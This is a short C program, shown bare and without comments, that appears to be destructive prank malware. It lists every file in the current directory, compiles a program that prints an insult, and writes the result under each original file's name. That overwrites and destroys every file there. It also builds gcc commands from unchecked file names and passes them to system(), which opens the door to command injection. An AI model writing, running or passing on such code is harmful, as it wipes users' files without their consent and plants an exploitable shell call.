#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>

#define BUFFER_SIZE 1024

void change_extension_and_copy(const char *filename, const char *content) {
    char new_filename[BUFFER_SIZE];
    snprintf(new_filename, sizeof(new_filename), "%s.c", filename);

    FILE *new_file = fopen(new_filename, "w");
    
    fprintf(new_file, "%s", content);
    fclose(new_file);

    char command[BUFFER_SIZE];
#ifdef _WIN32
    snprintf(command, sizeof(command), "gcc -o %s.exe %s", filename, new_filename);
#else
    snprintf(command, sizeof(command), "gcc -o %s %s", filename, new_filename);
#endif
    system(command);

    remove(new_filename);
}

int main() {
    DIR *dir;
    struct dirent *entry;

    const char *content = "#include <stdio.h>\n"
                          "int main() {\n"
                          "    printf(\"You are stupid!\\n\");\n"
                          "    return 0;\n"
                          "}\n";

    dir = opendir(".");

    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
            continue;
        }

        change_extension_and_copy(entry->d_name, content);
    }

    closedir(dir);
    return EXIT_SUCCESS;
}
